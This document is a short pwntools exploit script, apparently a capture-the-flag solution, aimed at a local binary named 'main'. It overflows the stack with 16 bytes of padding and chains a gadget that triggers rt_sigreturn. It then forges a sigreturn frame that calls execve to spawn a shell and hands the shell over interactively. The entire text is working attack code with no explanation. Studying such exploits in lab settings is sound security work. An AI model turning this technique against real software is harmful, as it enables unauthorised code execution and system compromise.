from pwn import *
context.log_level = 'debug'
exe = context.binary = ELF('./main')
r = process()
gdb.attach(r)
sleep(2)
rop = ROP(exe)
rop.raw(b"A" * 16)
rop.raw(0x000000000040112a)
rop.raw(0xf)
frame = SigreturnFrame()
frame.rax = 0x3b
frame.rdi = 0x402004
frame.rsi = 0x0
frame.rdx = 0x0
frame.rip = 0x000000000040112b
payload = rop.chain()
payload += bytes(frame)
print(payload)
r.sendline(payload)
r.interactive()